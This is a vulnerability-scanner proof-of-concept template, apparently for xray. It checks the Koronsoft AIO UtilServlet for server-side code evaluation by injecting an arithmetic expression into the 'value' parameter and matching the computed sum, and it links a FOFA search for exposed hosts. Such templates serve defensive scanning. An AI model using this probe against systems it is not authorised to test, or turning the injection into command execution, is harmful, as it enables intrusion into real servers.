name: poc-yaml-koronsoft-aio-utilservlet-bshexec
binding: a0a0b67e-51bc-4769-a476-bb5312e423f3
manual: true
detail:
    author: y0y0
    links:
        - https://mp.weixin.qq.com/s/OJPhl17HS8EBC6GLEAPvDg
        - https://fofa.info/result?qbase64=aWNvbl9oYXNoPSItNjM4MjkyMDg5Ig%3D%3D
    vulnerability:
        level: critical
transport: http
set:
    r1: randomInt(800000000, 999999999)
    r2: randomInt(800000000, 999999999)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /UtilServlet?operation=calculate&value={{r1}}%2B{{r2}}%3B&fieldName=_1
        expression: response.status == 200 && response.body_string.startsWith(string(r1 + r2))
expression: r0()
